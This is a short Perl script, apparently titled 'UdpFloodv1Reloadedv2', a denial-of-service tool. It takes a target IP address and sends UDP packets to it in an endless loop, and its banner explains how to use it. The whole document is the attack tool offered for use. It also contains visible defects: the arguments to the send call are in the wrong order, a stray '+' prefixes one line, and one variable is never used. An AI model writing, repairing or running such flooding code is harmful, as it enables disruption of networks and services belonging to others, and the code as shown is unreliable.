#!/usr/bin/perl
# CimX's UdpFloodv1Reloadedv2
use IO::Socket;

banner() unless (@ARGV == 1);
my $dhost = shift(@ARGV);
my $dport = int(rand(65534));
   $msg="1";
   $socket = IO::Socket::INET->new(Proto => 'udp', PeerAddr => $dhost,
+ PeerPort => $dport);
   while(1) {
      $size =rand() * rand() * rand();
      send($socket, 0, $size);
}
sub banner
{
    print
"===========================================
Made by CimX - - - - - - -  - - - - - - -  -
        Connects to specified IP,
    Example UdpFloodv1Reloadedv2.pl 1.1.1.1
Usage UdpFloodv1Reloadedv2.pl [target ip]
===========================================";
exit(1);
}